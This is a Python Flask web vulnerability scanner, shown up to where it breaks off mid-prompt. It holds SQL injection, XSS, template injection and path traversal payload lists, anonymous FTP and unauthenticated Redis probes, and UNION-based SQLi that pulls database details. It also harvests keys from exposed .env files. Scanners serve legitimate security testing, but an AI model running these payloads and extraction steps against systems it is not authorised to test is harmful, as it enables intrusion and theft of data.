#!/usr/bin/env python3
"""WebScan Pro v3.0 - Advanced Web Vulnerability Scanner"""

import os,re,ssl,time,json,uuid,socket,threading,warnings
from datetime import datetime
from urllib.parse import urlparse,urljoin,parse_qsl,urlencode
from concurrent.futures import ThreadPoolExecutor,as_completed
import requests
from bs4 import BeautifulSoup
from flask import Flask,request,jsonify

warnings.filterwarnings("ignore")
try: requests.packages.urllib3.disable_warnings()
except: pass
try:    import dns.resolver; DNS_AVAILABLE=True
except: DNS_AVAILABLE=False
try:    import whois as wh; WHOIS_AVAILABLE=True
except: WHOIS_AVAILABLE=False

GEMINI_ENV  = os.environ.get("GEMINI_API_KEY","")
REQ_TIMEOUT = 7
MAX_THREADS = 12
SCAN_DELAY  = 0.10
MAX_CRAWL   = 15
PORT        = int(os.environ.get("PORT",5000))
app   = Flask(__name__)
scans = {}

GEMINI_MODELS = [
    ("v1beta","gemini-2.0-flash"),
    ("v1beta","gemini-2.0-flash-lite"),
    ("v1beta","gemini-2.0-flash-exp"),
    ("v1beta","gemini-1.5-flash-latest"),
    ("v1beta","gemini-1.5-flash"),
    ("v1beta","gemini-1.5-flash-8b"),
    ("v1beta","gemini-1.5-pro-latest"),
    ("v1beta","gemini-1.5-pro"),
    ("v1",    "gemini-1.5-flash"),
    ("v1",    "gemini-1.5-pro"),
    ("v1beta","gemini-pro"),
    ("v1beta","gemini-1.0-pro"),
    ("v1",    "gemini-pro"),
]

COMMON_PORTS={
    21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",
    80:"HTTP",110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",
    3306:"MySQL",3389:"RDP",5432:"PostgreSQL",6379:"Redis",
    8080:"HTTP-Alt",8443:"HTTPS-Alt",9200:"Elasticsearch",
    27017:"MongoDB",11211:"Memcached",8888:"Jupyter",
}
DANGEROUS_SERVICES={
    "Telnet":      ("CRITICAL","Plaintext auth, no encryption"),
    "Redis":       ("HIGH",    "Often runs without auth — all data readable"),
    "Elasticsearch":("HIGH",  "No auth by default in older versions"),
    "MongoDB":     ("HIGH",   "No auth by default in older versions"),
    "Memcached":   ("MEDIUM", "No auth, amplification attack risk"),
    "Jupyter":     ("CRITICAL","Direct code execution if no password set"),
}

SQL_PAYLOADS=[
    "'",'"',"''","\\'",
    "' OR 1=1--","' OR '1'='1","' OR 1=1#",
    "\" OR 1=1--","admin'--","admin'#","admin' OR 1=1--",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--+","1' ORDER BY 2--+","1' ORDER BY 3--+",
    "1 AND 1=1","1 AND 1=2",
    "' AND SLEEP(3)--","1; WAITFOR DELAY '0:0:3'--",
    "'; SELECT pg_sleep(3)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--",
    "%27","1%27 OR 1=1",
]

SQL_ERRORS=[
    r"sql syntax.*mysql",r"warning.*mysql_",
    r"you have an error in your sql syntax",
    r"check the manual that corresponds to your (mysql|mariadb)",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"microsoft ole db provider",
    r"pg_exec\(\)",r"pg_query\(",
    r"ora-\d{5}",r"oracle error",
    r"sqlite_.*error",r"error.*sqlite",
    r"sql server.*driver",r"mssql_query\(",
    r"syntax error.*in query expression",
    r"data type mismatch in criteria",
    r"invalid column name",r"unknown column",
    r"right syntax to use near",r"column count doesn",
    r"supplied argument is not a valid",
]

XSS_PAYLOADS=[
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '{{7*7}}','${7*7}','#{7*7}',
]

SENSITIVE_FILES=[
    "/.env","/.env.local","/.env.backup","/.env.prod",
    "/.git/config","/.git/HEAD",
    "/config.php","/wp-config.php","/configuration.php",
    "/config.yml","/config.json","/database.yml","/secrets.yml",
    "/.htaccess","/.htpasswd","/web.config",
    "/phpinfo.php","/info.php","/test.php",
    "/backup.sql","/dump.sql","/db.sql",
    "/backup.zip","/backup.tar.gz",
    "/robots.txt","/sitemap.xml",
    "/xmlrpc.php","/wp-login.php",
    "/composer.json","/package.json",
    "/server-status","/server-info",
    "/swagger.json","/api-docs","/graphql",
    "/.bash_history","/readme.md",
]

ADMIN_PATHS=[
    "/admin","/admin/","/administrator","/wp-admin",
    "/phpmyadmin","/pma/","/dashboard","/panel",
    "/manage","/backend","/cms","/login","/signin",
    "/user/login","/auth/login","/cpanel",
]

LFI_PAYLOADS=[
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

LFI_INDICATORS=["root:x:","bin:x:","[extensions]","[fonts]"]
OPEN_REDIRECT_PARAMS=["redirect","url","next","return","returnTo",
                      "goto","target","redir","dest","to","forward"]

SECURITY_HEADERS={
    "X-Frame-Options":           {"desc":"Clickjacking protection",     "risk":"HIGH",   "rec":"DENY"},
    "X-XSS-Protection":          {"desc":"Browser XSS filter",          "risk":"MEDIUM", "rec":"1; mode=block"},
    "X-Content-Type-Options":    {"desc":"MIME sniffing protection",     "risk":"MEDIUM", "rec":"nosniff"},
    "Strict-Transport-Security": {"desc":"Force HTTPS (HSTS)",           "risk":"HIGH",   "rec":"max-age=31536000; includeSubDomains"},
    "Content-Security-Policy":   {"desc":"XSS and injection protection", "risk":"HIGH",   "rec":"default-src 'self'"},
    "Referrer-Policy":           {"desc":"Controls referrer info",       "risk":"LOW",    "rec":"strict-origin-when-cross-origin"},
    "Permissions-Policy":        {"desc":"Browser feature control",      "risk":"LOW",    "rec":"geolocation=(), microphone=()"},
}

VULN_SEVERITY={
    "SQL Injection":"CRITICAL","SQL Injection (Form)":"CRITICAL",
    "Data Extraction via SQLi":"CRITICAL",
    "Server-Side Template Injection":"CRITICAL",
    "Local File Inclusion":"CRITICAL",
    "Unauthenticated Redis":"CRITICAL",
    "Unauthenticated Jupyter":"CRITICAL",
    "No HTTPS":"HIGH",
    "Reflected XSS":"HIGH","Reflected XSS (Form)":"HIGH",
    "Sensitive File Exposed":"HIGH","Admin Panel Found":"HIGH",
    "Expired SSL Certificate":"HIGH","Invalid SSL Certificate":"HIGH",
    "Unauthenticated Elasticsearch":"HIGH",
    "CORS Misconfiguration (HIGH)":"HIGH",
    "CORS Misconfiguration (CRITICAL)":"CRITICAL",
    "Missing Header (HIGH)":"HIGH",
    "Open Port (Dangerous)":"HIGH",
    "Clickjacking Vulnerability":"MEDIUM",
    "CSRF Missing Token":"MEDIUM","Open Redirect":"MEDIUM",
    "Dangerous HTTP Method":"MEDIUM","Weak TLS":"MEDIUM",
    "Directory Listing":"MEDIUM","Insecure Cookie":"MEDIUM",
    "Missing Header (MEDIUM)":"MEDIUM",
    "Info Disclosure":"LOW","Missing Header (LOW)":"LOW","Open Port":"LOW",
}

VULN_FIXES={
    "SQL Injection":"Use parameterized queries: cursor.execute('SELECT * FROM users WHERE id=%s', (id,))",
    "Reflected XSS":"Encode output: htmlspecialchars($input, ENT_QUOTES, 'UTF-8')",
    "No HTTPS":"Install SSL (free via Let's Encrypt) and redirect all HTTP to HTTPS",
    "CSRF Missing Token":"Add random CSRF token to every POST form, validate server-side",
    "Sensitive File Exposed":"Remove or restrict access. Move sensitive files outside webroot",
    "Missing Header (HIGH)":"Add header to server config. e.g. Apache: Header always set X-Frame-Options DENY",
    "Local File Inclusion":"Whitelist allowed paths. Never pass raw user input to file functions",
    "Clickjacking Vulnerability":"Add: X-Frame-Options: DENY  or  Content-Security-Policy: frame-ancestors 'none'",
    "Insecure Cookie":"Set-Cookie: name=val; Secure; HttpOnly; SameSite=Strict",
}

class ScanJob:
    TOTAL=12
    def __init__(self,url,gemini_key=""):
        self.id=str(uuid.uuid4())[:8]
        self.url=url
        self.gemini_key=gemini_key.strip() or GEMINI_ENV
        self.status="running"
        self.logs=[]
        self.vulns=[]
        self.results={}
        self.ai_analysis=""
        self.start=time.time()
        self.elapsed=0
        self.progress=0
        self.current_mod="Initializing"

    def log(self,msg,level="INFO"):
        self.logs.append({"msg":str(msg),"level":level,
                          "time":datetime.now().strftime("%H:%M:%S")})

    def add_vuln(self,vtype,detail,extracted=None):
        sev=VULN_SEVERITY.get(vtype,"MEDIUM")
        fix=VULN_FIXES.get(vtype,"Review and remediate this vulnerability")
        entry={"type":vtype,"detail":str(detail),"severity":sev,"fix":fix}
        if extracted: entry["extracted_data"]=str(extracted)[:300]
        if entry["detail"] not in [v["detail"] for v in self.vulns]:
            self.vulns.append(entry)

    def mod(self,name,num):
        self.current_mod=name
        self.progress=int((num/self.TOTAL)*100)
        self.log(f">> {name}","HEAD")

    def done(self):
        self.status="done"
        self.progress=100
        self.current_mod="Complete"
        self.elapsed=round(time.time()-self.start,1)


def req(url,method="GET",params=None,data=None,
        headers=None,allow_redirects=True,timeout=REQ_TIMEOUT):
    h={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
       "Accept":"text/html,*/*;q=0.8","Accept-Language":"en-US,en;q=0.5"}
    if headers: h.update(headers)
    try:
        return requests.request(method,url,params=params,data=data,
            headers=h,allow_redirects=allow_redirects,timeout=timeout,verify=False)
    except: return None


def call_gemini(api_key,prompt,job):
    if not api_key: return None
    payload={"contents":[{"parts":[{"text":prompt}]}],
             "generationConfig":{"maxOutputTokens":2000,"temperature":0.3}}
    for api_ver,model in GEMINI_MODELS:
        url=f"https://generativelanguage.googleapis.com/{api_ver}/models/{model}:generateContent"
        try:
            r=requests.post(url,params={"key":api_key},json=payload,timeout=25)
            if r.status_code==200:
                text=r.json()["candidates"][0]["content"]["parts"][0]["text"]
                job.log(f"Gemini OK: {model} ({api_ver})","OK")
                return text
            err=r.json().get("error",{}).get("message","")[:50]
            job.log(f"  {model}: {r.status_code} {err}","SKIP")
        except Exception as e:
            job.log(f"  {model}: {str(e)[:40]}","SKIP")
    job.log("No working Gemini model found for this key","WARN")
    return None


# ── MODULE 1: Port Scanner ────────────────────────────────────────────────────
def probe_port(host,port):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(1.2)
        if s.connect_ex((host,port))==0:
            banner=""
            try:
                if port in(80,8080): s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner=s.recv(256).decode("utf-8",errors="ignore").strip()[:100]
            except: pass
            s.close(); return True,banner
        s.close(); return False,""
    except: return False,""

def try_redis(host,job):
    try:
        s=socket.socket(); s.settimeout(3); s.connect((host,6379))
        s.send(b"INFO server\r\n")
        data=s.recv(1024).decode("utf-8",errors="ignore"); s.close()
        if "redis_version" in data:
            ver=re.search(r"redis_version:(.+)",data)
            info=ver.group(1).strip() if ver else "unknown"
            job.log(f"REDIS DATA EXTRACTED: version={info}","VULN")
            job.add_vuln("Unauthenticated Redis",f"Port 6379 open, no auth — v{info}",data[:200])
            return True
    except: pass
    return False

def try_elasticsearch(host,job):
    for port in[9200,9201]:
        r=req(f"http://{host}:{port}/_cat/indices?v",timeout=4)
        if r and r.status_code==200 and("green" in r.text or "yellow" in r.text or "index" in r.text):
            job.log(f"ELASTICSEARCH INDICES EXPOSED on port {port}!","VULN")
            job.add_vuln("Unauthenticated Elasticsearch",f"Port {port} — all indices listed",r.text[:300])
            return True
        r2=req(f"http://{host}:{port}/",timeout=4)
        if r2 and "cluster_name" in r2.text:
            job.add_vuln("Unauthenticated Elasticsearch",f"Port {port} — cluster info exposed",r2.text[:200])
            return True
    return False

def try_ftp_anon(host,job):
    try:
        s=socket.socket(); s.settimeout(4); s.connect((host,21))
        banner=s.recv(256).decode("utf-8",errors="ignore")
        s.send(b"USER anonymous\r\n"); time.sleep(0.4); s.recv(256)
        s.send(b"PASS anon@test.com\r\n"); time.sleep(0.4)
        resp=s.recv(256).decode("utf-8",errors="ignore"); s.close()
        if "230" in resp:
            job.log("FTP ANONYMOUS LOGIN SUCCESS!","VULN")
            job.add_vuln("FTP Anonymous Login",f"Port 21 open, no credentials needed. Banner:{banner[:60]}")
            return True
    except: pass
    return False

def run_ports(job):
    job.mod("Port Scanner & Service Exploits",1)
    host=urlparse(job.url).hostname
    opened=[]
    with ThreadPoolExecutor(max_workers=20) as ex:
        futs={ex.submit(probe_port,host,p):(p,s) for p,s in COMMON_PORTS.items()}
        for fut in as_completed(futs):
            port,svc=futs[fut]
            is_open,banner=fut.result()
            if is_open:
                entry={"port":port,"service":svc,"banner":banner[:70]}
                opened.append(entry)
                if svc in DANGEROUS_SERVICES:
                    risk,reason=DANGEROUS_SERVICES[svc]
                    job.log(f"Port {port} ({svc}) OPEN [{risk}] - {reason}","VULN")
                    job.add_vuln("Open Port (Dangerous)",f"{svc} on port {port}: {reason}")
                else:
                    job.log(f"Port {port} ({svc}) open","OK")
    port_nums=[p["port"] for p in opened]
    if 6379 in port_nums: try_redis(host,job)
    if 9200 in port_nums or 9201 in port_nums: try_elasticsearch(host,job)
    if 21 in port_nums: try_ftp_anon(host,job)
    if not opened: job.log("No extra open ports detected","OK")
    job.results["ports"]={"open":opened}


# ── MODULE 2: Crawler ─────────────────────────────────────────────────────────
def crawl(base_url,job):
    job.log("Crawling site for parameterized URLs...","INFO")
    found=set(); visited=set(); queue=[base_url]
    base_d=urlparse(base_url).netloc
    while queue and len(found)<MAX_CRAWL:
        url=queue.pop(0)
        if url in visited or len(visited)>35: continue
        visited.add(url)
        resp=req(url,timeout=5)
        if not resp: continue
        soup=BeautifulSoup(resp.text,"html.parser")
        for a in soup.find_all("a",href=True):
            full=urljoin(url,a["href"])
            p=urlparse(full)
            if p.netloc!=base_d: continue
            clean=p._replace(fragment="").geturl()
            if p.query: found.add(clean)
            elif clean not in visited: queue.append(clean)
        for form in soup.find_all("form"):
            action=urljoin(url,form.get("action",url))
            inputs={i.get("name"):i.get("value","1")
                    for i in form.find_all(["input","select"]) if i.get("name")}
            if inputs: found.add(action+"?"+urlencode(inputs))
    result=list(found)[:MAX_CRAWL]
    job.log(f"Found {len(result)} URL(s) with parameters to test","OK")
    for u in result: job.log(f"  -> {u[:80]}","INFO")
    return result


# ── MODULE 3: Recon ───────────────────────────────────────────────────────────
def run_recon(job):
    job.mod("Reconnaissance & Fingerprinting",3)
    host=urlparse(job.url).netloc.split(":")[0]
    try:
        ip=socket.gethostbyname(host)
        job.log(f"IP Address   : {ip}","OK")
        job.results["ip"]=ip
    except: job.log("Cannot resolve hostname","WARN")
    if DNS_AVAILABLE:
        for rtype in["A","MX","NS","TXT"]:
            try:
                ans=dns.resolver.resolve(host,rtype)
                job.log(f"DNS {rtype:<6}: {', '.join(str(r) for r in ans)[:60]}","OK")
            except: pass
    if WHOIS_AVAILABLE:
        try:
            w=wh.whois(host)
            job.log(f"Registrar    : {w.registrar}","OK")
        except: pass
    r=req(job.url+"/?id=<script>alert(1)</script>")
    if r:
        hlc={k.lower():v.lower() for k,v in r.headers.items()}
        waf=None
        if "cloudflare" in str(r.headers).lower(): waf="Cloudflare"
        elif r.status_code in(403,406,429,503): waf="Unknown WAF"
        elif "x-sucuri-id" in hlc: waf="Sucuri WAF"
        job.log(f"WAF/CDN      : {waf if waf else 'Not detected'}","WARN" if waf else "OK")
    resp=req(job.url)
    if resp:
        h=resp.headers; body=resp.text.lower()
        if h.get("Server"):
            job.log(f"Server       : {h['Server']} <- info leak!","WARN")
            job.add_vuln("Info Disclosure",f"Server header reveals: {h['Server']}")
        if h.get("X-Powered-By"):
            job.log(f"X-Powered-By : {h['X-Powered-By']} <- version leaked!","VULN")
            job.add_vuln("Info Disclosure",f"X-Powered-By: {h['X-Powered-By']}")
        for cms,sigs in{
            "WordPress":["wp-content","wp-includes"],
            "Joomla":["joomla","/components/com_"],
            "Drupal":["drupal","sites/default/files"],
            "Laravel":["laravel_session"],
            "Django":["csrfmiddlewaretoken"],
        }.items():
            if any(s in body+str(h.get("Set-Cookie","")).lower() for s in sigs):
                job.log(f"Framework    : {cms} detected","WARN")
        for cookie in resp.cookies:
            flags=[]
            sc=h.get("Set-Cookie","").lower()
            if not cookie.secure: flags.append("No Secure flag")
            if "httponly" not in sc: flags.append("No HttpOnly flag")
            if "samesite" not in sc: flags.append("No SameSite flag")
            if flags:
                job.add_vuln("Insecure Cookie",f"Cookie '{cookie.name}': {', '.join(flags)}")
                job.log(f"Cookie '{cookie.name}': {', '.join(flags)}","VULN")


# ── MODULE 4: Headers ─────────────────────────────────────────────────────────
def run_headers(job):
    job.mod("Security Headers Analysis",4)
    resp=req(job.url)
    if not resp: return
    hlc={k.lower():v for k,v in resp.headers.items()}
    for hdr,info in SECURITY_HEADERS.items():
        if hdr.lower() in hlc:
            val=hlc[hdr.lower()]
            job.log(f"OK {hdr}: {val[:50]}","OK")
            if hdr=="Content-Security-Policy" and("unsafe-inline" in val or "unsafe-eval" in val):
                job.add_vuln("Missing Header (MEDIUM)",f"Weak CSP: {val[:60]}")
        else:
            risk=info["risk"]
            job.log(f"MISSING {hdr} [{risk}] - {info['desc']}","VULN")
            if risk in("HIGH","MEDIUM"):
                job.add_vuln(f"Missing Header ({risk})",f"No {hdr} - {info['desc']}")
    if "x-frame-options" not in hlc and "content-security-policy" not in hlc:
        job.add_vuln("Clickjacking Vulnerability","No X-Frame-Options or CSP frame-ancestors — site embeddable in iframes")
    r=req(job.url.rstrip("/")+"/images/")
    if r and r.status_code==200 and "index of" in r.text.lower():
        job.log("Directory listing ENABLED on /images/!","VULN")
        job.add_vuln("Directory Listing","Server exposes file listing at /images/")


# ── MODULE 5: SSL ─────────────────────────────────────────────────────────────
def run_ssl(job):
    job.mod("SSL/TLS Analysis",5)
    parsed=urlparse(job.url)
    if parsed.scheme!="https":
        job.log("CRITICAL: Site NOT using HTTPS!","VULN")
        job.add_vuln("No HTTPS","All traffic transmitted in cleartext over HTTP")
        job.results["ssl"]={"https":False}
        return
    host=parsed.hostname
    try:
        ctx=ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(),server_hostname=host) as s:
            s.settimeout(6); s.connect((host,443))
            cert=s.getpeercert(); version=s.version()
        job.log(f"TLS Version  : {version}","OK")
        if version in("TLSv1","TLSv1.1"):
            job.add_vuln("Weak TLS",f"Using deprecated {version} — vulnerable to POODLE/BEAST attacks")
        exp_str=cert.get("notAfter","")
        exp_date=datetime.strptime(exp_str,"%b %d %H:%M:%S %Y %Z")
        days=(exp_date-datetime.utcnow()).days
        if days<0: job.add_vuln("Expired SSL Certificate",f"Certificate expired {abs(days)} days ago!")
        elif days<30: job.log(f"Cert expires in {days} days — renew soon!","WARN")
        else: job.log(f"Cert valid — {days} days remaining","OK")
        subject=dict(x[0] for x in cert.get("subject",[]))
        job.log(f"CN           : {subject.get('commonName','N/A')}","OK")
    except ssl.SSLCertVerificationError as e:
        job.add_vuln("Invalid SSL Certificate",str(e))
    except Exception as e:
        job.log(f"SSL check error: {e}","WARN")
    http_url=job.url.replace("https://","http://")
    r=req(http_url,allow_redirects=False)
    if r and r.status_code==200:
        job.add_vuln("No HTTPS","HTTP version accessible without redirect — HSTS not enforced")


# ── MODULE 6: Sensitive Files ─────────────────────────────────────────────────
def run_files(job):
    job.mod("Sensitive Files & Admin Panels",6)
    base=job.url.rstrip("/")
    def probe(path,cat):
        r=req(base+path,allow_redirects=False)
        if r and r.status_code in(200,401,403):
            extracted=None
            if r.status_code==200:
                content=r.text
                if path=="/.git/config":
                    m=re.search(r"url\s*=\s*(.+)",content)
                    if m: extracted=f"Repo URL: {m.group(1)}"
                elif path=="/.env":
                    keys=re.findall(r"([A-Z_]+=.{1,40})",content)
                    if keys: extracted="Keys: "+" | ".join(keys[:3])
                elif "phpinfo" in path:
                    extracted="PHP configuration fully exposed!"
            return path,r.status_code,cat,extracted
        return None
    all_paths=[(p,"sensitive") for p in SENSITIVE_FILES]+[(p,"admin") for p in ADMIN_PATHS]
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        futs={ex.submit(probe,p,c):(p,c) for p,c in all_paths}
        for fut in as_completed(futs):
            res=fut.result()
            if res:
                path,status,cat,extracted=res
                label="EXPOSED" if status==200 else "EXISTS(protected)"
                job.log(f"[{status}] {label}: {path}","VULN")
                if extracted: job.log(f"  DATA: {extracted}","VULN")
                if cat=="sensitive":
                    detail=f"{base}{path} [{status}]"+(f" | {extracted}" if extracted else "")
                    job.add_vuln("Sensitive File Exposed",detail,extracted)
                elif status==200:
                    job.add_vuln("Admin Panel Found",f"{base}{path}")
    job.results["files"]={}


# ── MODULE 7: SQL Injection + Data Extraction ──────────────────────────────────
def sqli_extract(target_url,param,params,job):
    job.log(f"  Attempting SQLi data extraction on '{param}'...","INFO")
    extracted={}
    for cols in range(1,5):
        pfx="NULL,"*(cols-1)
        tests=[
            (f"' UNION SELECT {pfx}version()--","DB Version"),
            (f"' UNION SELECT {pfx}database()--","DB Name"),
            (f"' UNION SELECT {pfx}user()--","DB User"),
        ]
        for payload,label in tests:
            tp=params.copy(); tp[param]=payload
            r=req(target_url,params=tp)
            if r:
                vm=re.search(r"\b(\d+\.\d+[\.\d\-\w]+)\b",r.text)
                dm=re.search(r"\b([a-z][a-z0-9_]+)@[\w.]+\b",r.text)
                if vm: extracted[label]=vm.group(1)
                elif dm: extracted[label]=dm.group(1)
            time.sleep(SCAN_DELAY)
        if extracted: break
    if extracted:
        info=json.dumps(extracted)
        job.log(f"  DATA EXTRACTED via SQLi: {info}","VULN")
        job.add_vuln("Data Extraction via SQLi",f"Param '{param}': {info}",info)

def run_sqli(urls,job):
    job.mod("SQL Injection Testing",7)
    found_keys=set()
    for target_url in urls:
        parsed=urlparse(target_url)
        if not parsed.query: continue
        params=dict(parse_qsl(parsed.query))
        job.log(f"SQLi: {target_url[:70]}","INFO")
        for param in params:
            for payload in SQL_PAYLOADS:
                tp=params.copy(); tp[param]=payload
                r=req(target_url,params=tp)
                if not r: time.sleep(SCAN_DELAY); continue
                body=r.text.lower()
                for err in SQL_ERRORS:
                    if re.search(err,body,re.IGNORECASE):
                        key=f"{target_url}:{param}"
                        if key not in found_keys:
                            found_keys.add(key)
                            job.log(f"SQLi FOUND! Param:'{param}' URL:{target_url[:50]}","VULN")
                            job.add_vuln("SQL Injection",f"Param '{param}' on {target_url[:60]}")
                            sqli_extract(target_url,param,params,job)
                        break
                time.sleep(SCAN_DELAY)
    for target_url in urls[:3]:
        resp=req(target_url)
        if not resp: continue
        soup=BeautifulSoup(resp.text,"html.parser")
        for form in soup.find_all("form"):
            action=urljoin(target_url,form.get("action",target_url))
            method=form.get("method","get").lower()
            fields={i.get("name"):i.get("value","test")
                    for i in form.find_all(["input","textarea"]) if i.get("name")}
            if not fields: continue
            for field in fields:
                for payload in SQL_PAYLOADS[:12]:
                    data=fields.copy(); data[field]=payload
                    r=req(action,method="POST",data=data) if method=="post" else req(action,params=data)
                    if r:
                        body=r.text.lower()
                        for err in SQL_ERRORS:
                            if re.search(err,body,re.IGNORECASE):
                                job.log(f"SQLi FORM! Field:'{field}'","VULN")
                                job.add_vuln("SQL Injection (Form)",f"Field '{field}' on {action[:60]}")
                                break
                    time.sleep(SCAN_DELAY)
    if not found_keys: job.log("No SQL injection found","OK")


# ── MODULE 8: XSS ─────────────────────────────────────────────────────────────
def run_xss(urls,job):
    job.mod("XSS & Template Injection",8)
    for target_url in urls:
        parsed=urlparse(target_url)
        if not parsed.query: continue
        params=dict(parse_qsl(parsed.query))
        job.log(f"XSS: {target_url[:70]}","INFO")
        for param in params:
            for payload in XSS_PAYLOADS:
                tp=params.copy(); tp[param]=payload
                r=req(target_url,params=tp)
                if r and payload in r.text:
                    if payload in("{{7*7}}","${7*7}","#{7*7}") and "49" in r.text:
                        job.log(f"SSTI! Param:'{param}' — 7*7=49 executed!","VULN")
                        job.add_vuln("Server-Side Template Injection",f"Param '{param}' executes server-side code!")
                    else:
                        job.log(f"XSS FOUND! Param:'{param}' payload reflected!","VULN")
                        job.add_vuln("Reflected XSS",f"Param '{param}' on {target_url[:60]}")
                    break
                time.sleep(SCAN_DELAY)
    for target_url in urls[:2]:
        resp=req(target_url)
        if not resp: continue
        for form in BeautifulSoup(resp.text,"html.parser").find_all("form"):
            action=urljoin(target_url,form.get("action",target_url))
            method=form.get("method","get").lower()
            fields={i.get("name"):"safe"
                    for i in form.find_all(["input","textarea"])
                    if i.get("name") and i.get("type","text").lower() not in["submit","hidden"]}
            for field in fields:
                for payload in XSS_PAYLOADS[:8]:
                    data=fields.copy(); data[field]=payload
                    r=req(action,method="POST",data=data) if method=="post" else req(action,params=data)
                    if r and payload in r.text:
                        job.log(f"XSS FORM! Field:'{field}'","VULN")
                        job.add_vuln("Reflected XSS (Form)",f"Field '{field}' on {action[:60]}")
                        break
                    time.sleep(SCAN_DELAY)


# ── MODULE 9: CORS + HTTP Methods ──────────────────────────────────────────────
def run_cors_methods(job):
    job.mod("CORS & HTTP Methods",9)
    for origin in["https://evil-attacker.com","null","https://attacker.example.com"]:
        r=req(job.url,headers={"Origin":origin})
        if not r: continue
        acao=r.headers.get("Access-Control-Allow-Origin","")
        acac=r.headers.get("Access-Control-Allow-Credentials","false")
        if acao==origin:
            sev="CRITICAL" if acac.lower()=="true" else "HIGH"
            job.log(f"CORS MISCONFIGURATION [{sev}]! creds={acac}","VULN")
            job.add_vuln(f"CORS Misconfiguration ({sev})",f"Origin '{origin}' reflected, credentials={acac}")
        elif acao=="*":
            job.log("CORS wildcard (*) — check if credentials used","WARN")
        else:
            job.log(f"CORS OK — '{origin[:25]}' rejected","OK")
    r=req(job.url,method="OPTIONS")
    if r:
        allow=r.headers.get("Allow","") or r.headers.get("Access-Control-Allow-Methods","")
        if allow:
            for m in["PUT","DELETE","TRACE","CONNECT"]:
                if m in allow:
                    job.log(f"Dangerous method ALLOWED: {m}","VULN")
                    job.add_vuln("Dangerous HTTP Method",f"{m} enabled — can modify/delete resources")
    r2=req(job.url,method="TRACE")
    if r2 and r2.status_code==200 and "TRACE" in r2.text.upper():
        job.log("TRACE method enabled — XST attack possible!","VULN")
        job.add_vuln("Dangerous HTTP Method","TRACE enabled — Cross-Site Tracing (XST)")


# ── MODULE 10: LFI / CSRF / Open Redirect ─────────────────────────────────────
def run_lfi_csrf(urls,job):
    job.mod("LFI / CSRF / Open Redirect",10)
    base_url=urls[0] if urls else job.url
    for target_url in urls:
        parsed=urlparse(target_url)
        params=dict(parse_qsl(parsed.query))
        fp={k:v for k,v in params.items()
            if any(kw in k.lower() for kw in
                   ["file","path","page","include","load","view","doc","lang"])}
        for param in fp:
            for payload in LFI_PAYLOADS:
                tp=params.copy(); tp[param]=payload
                r=req(target_url,params=tp)
                if r and any(ind in r.text for ind in LFI_INDICATORS):
                    extracted=r.text[:300] if "root:x:" in r.text else None
                    job.log(f"LFI FOUND! Param:'{param}'","VULN")
                    job.add_vuln("Local File Inclusion",f"Param '{param}' reads server files!",extracted)
                    break
                time.sleep(SCAN_DELAY)
    resp=req(base_url)
    if resp:
        soup=BeautifulSoup(resp.text,"html.parser")
        for i,form in enumerate(soup.find_all("form")):
            if form.get("method","get").lower()!="post": continue
            inputs=form.find_all("input")
            has_csrf=any(
                any(kw in(inp.get("name","")+inp.get("id","")).lower()
                    for kw in["csrf","token","_token","xsrf","nonce"])
                for inp in inputs)
            if not has_csrf:
                action=urljoin(base_url,form.get("action",base_url))
                job.add_vuln("CSRF Missing Token",f"POST form #{i+1} without CSRF token: {action[:60]}")
    for target_url in urls:
        parsed=urlparse(target_url)
        params=dict(parse_qsl(parsed.query))
        for param in params:
            if param.lower() in OPEN_REDIRECT_PARAMS:
                tp=params.copy(); tp[param]="https://evil-attacker.com"
                r=req(target_url,params=tp,allow_redirects=False)
                if r and r.status_code in(301,302,303,307,308):
                    if "evil-attacker.com" in r.headers.get("Location",""):
                        job.add_vuln("Open Redirect",f"Param '{param}' redirects to any URL")


# ── MODULE 11: Misc ───────────────────────────────────────────────────────────
def run_misc(job):
    job.mod("HTML Comments & Mixed Content",11)
    resp=req(job.url)
    if not resp: return
    body=resp.text
    for c in re.findall(r"<!--(.*?)-->",body,re.DOTALL):
        if any(kw in c.lower() for kw in["password","secret","api_key","token","todo","hack","fixme"]):
            job.log(f"Sensitive comment: {c.strip()[:70]}","VULN")
            job.add_vuln("Info Disclosure",f"Sensitive HTML comment: {c.strip()[:80]}")
    if re.findall(r'src=["\']http://[^"\']+["\']',body) and "https" in job.url:
        job.log("Mixed content: HTTP resources on HTTPS page","WARN")


# ── MODULE 12: Gemini ─────────────────────────────────────────────────────────
def run_gemini(job):
    job.mod("Gemini AI Analysis",12)
    if not job.gemini_key:
        job.log("No Gemini key — skipping AI analysis","SKIP")
        job.log("Get free key: https://aistudio.google.com/app/apikey","INFO")
        return
    vuln_summary=json.dumps(job.vulns,default=str)[:4000]
    ports_info=json.dumps(job.results.get("ports",{}),default=str)[:500]
    prompt=f"""You are a senior OWASP penetration tester. Analyze this scan of: {job.url}

VULNERABILITIES ({len(job.vulns)} found):
{vuln_summary}

OPEN PORTS: {ports_info}

Write a security report:

## RISK LEVEL
CRITICAL/HIGH/MEDIUM/LOW + one sentence why.

## SECURITY SCORE
X/100 with justification.

## TOP VULNERABILITIES
For each found vulnerability:
- What it is (1 line simple explanation)
- Step-by-step attack scenario
- Business impact
- Code fix example

## PORT-BASED ATTACKS
